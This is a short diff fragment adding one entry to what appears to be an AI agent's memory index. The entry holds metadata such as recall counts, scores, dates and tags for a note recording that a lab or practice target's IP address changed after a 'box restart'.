+      "path": "memory/2026-05-09.md",
+      "startLine": 81,
+      "endLine": 83,
+      "source": "memory",
+      "snippet": "Target Changed (Box Restart): | Old | New | |-----|-----| | `154.57.164.64:31180` | `154.57.164.66:30156` |",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.62,
+      "maxScore": 0.62,
+      "firstRecalledAt": "2026-05-16T19:00:19.558Z",
+      "lastRecalledAt": "2026-05-16T19:00:19.558Z",
+      "queryHashes": [
+        "f9349cbeaf46"
+      ],
+      "recallDays": [
+        "2026-05-17",
+        "2026-05-16"
+      ],
+      "conceptTags": [
+        "154.57.164.64",
+        "154.57.164.66",
+        "target",
+        "changed",
+        "box",
+        "restart",
+        "old",
+        "new"
       ]
     }
   }
